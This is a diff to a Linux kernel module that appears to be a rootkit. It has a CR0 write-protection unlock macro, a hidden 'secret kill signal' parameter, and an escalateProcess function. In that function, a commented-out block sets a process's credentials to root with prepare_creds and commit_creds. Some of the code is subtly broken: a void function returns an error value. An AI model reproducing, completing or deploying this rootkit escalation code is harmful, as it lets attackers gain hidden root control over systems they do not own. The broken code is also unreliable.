@@ -4,6 +4,9 @@
 #include <linux/kallsyms.h>
 #include <linux/unistd.h>
 #include <linux/syscalls.h>
+#include <linux/sched.h>
+#include <linux/cred.h>
+#include <linux/uidgid.h>
 
 #define CR0_WRITE_UNLOCK(x) \
 	do { \
@@ -57,6 +60,24 @@ MODULE_PARM_DESC(secretKillSig, "define a kill signal which when used will repla
 
 void escalateProcess(pid_t pid){
 	pr_info("escalation called for pid %d\n", pid);
+
+	struct task_struct * currentTask = get_current();
+	pr_info("current task struct has pid %d\n", currentTask->pid);
+	/*
+	kuid_t kuid = KUIDT_INIT(0);
+	kgid_t kgid = KGIDT_INIT(0);
+
+	struct cred* elevatedCred = prepare_creds();
+	if(elevatedCred == NULL){
+		pr_info("ERROR: prepare_creds() returned NULL\n");
+		return -ENOMEM;
+	}
+	elevatedCred->uid = kuid;
+	elevatedCred->gid = kgid;
+	elevatedCred->euid = kuid;
+	elevatedCred->egid = kgid;
+	pr_info("committing result %d\n", commit_creds(elevatedCred));
+	*/
 	return;
 }
 
